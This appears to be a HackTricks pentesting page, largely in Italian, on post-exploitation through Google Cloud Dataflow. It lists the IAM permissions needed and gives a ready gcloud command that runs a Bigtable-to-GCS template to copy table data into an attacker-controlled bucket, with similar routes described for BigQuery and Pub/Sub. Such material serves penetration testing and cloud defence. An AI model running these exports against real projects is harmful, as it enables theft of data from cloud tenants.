# GCP - Dataflow Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Dataflow

Per maggiori informazioni su Dataflow consulta:

{{#ref}}
../gcp-services/gcp-dataflow-enum.md
{{#endref}}

### Using Dataflow to exfiltrate data from other services

**Autorizzazioni:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs` (su un SA con accesso alla sorgente e al sink)

Con i diritti di creazione dei job Dataflow, puoi usare i template GCP Dataflow per esportare dati da Bigtable, BigQuery, Pub/Sub e altri servizi in bucket GCS controllati dall'attaccante. Questa è una potente tecnica di post-exploitation quando hai ottenuto accesso a Dataflow — per esempio tramite il [Dataflow Rider](../gcp-privilege-escalation/gcp-dataflow-privesc.md) privilege escalation (pipeline takeover via bucket write).

> [!NOTE]
> Hai bisogno di `iam.serviceAccounts.actAs` su un service account con permessi sufficienti per leggere la sorgente e scrivere nello sink. Di default viene usato il Compute Engine default SA se non specificato.

#### Bigtable to GCS

Vedi [GCP - Bigtable Post Exploitation](gcp-bigtable-post-exploitation.md#dump-rows-to-your-bucket) — "Dump rows to your bucket" per il pattern completo. Templates: `Cloud_Bigtable_to_GCS_Json`, `Cloud_Bigtable_to_GCS_Parquet`, `Cloud_Bigtable_to_GCS_SequenceFile`.

<details>

<summary>Esporta Bigtable in un bucket controllato dall'attaccante</summary>
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<YOUR_BUCKET>/raw-json/ \
--staging-location=gs://<YOUR_BUCKET>/staging/
```
</details>

#### BigQuery verso GCS

Esistono Dataflow templates per esportare i dati di BigQuery. Usa il template appropriato per il formato di destinazione (JSON, Avro, ecc.) e indirizza l'output al tuo bucket.

#### Pub/Sub e sorgenti streaming

Le pipeline in streaming possono leggere da Pub/Sub (o altre sorgenti) e scrivere su GCS. Avvia un job usando un template che legge dalla subscription Pub/Sub di destinazione e scrive nel tuo bucket controllato.

## Riferimenti

- [Dataflow templates](https://cloud.google.com/dataflow/docs/guides/templates/provided-templates)
- [Control access with IAM (Dataflow)](https://cloud.google.com/dataflow/docs/concepts/security-and-permissions)
- [GCP - Bigtable Post Exploitation](gcp-bigtable-post-exploitation.md)

{{#include ../../../banners/hacktricks-training.md}}
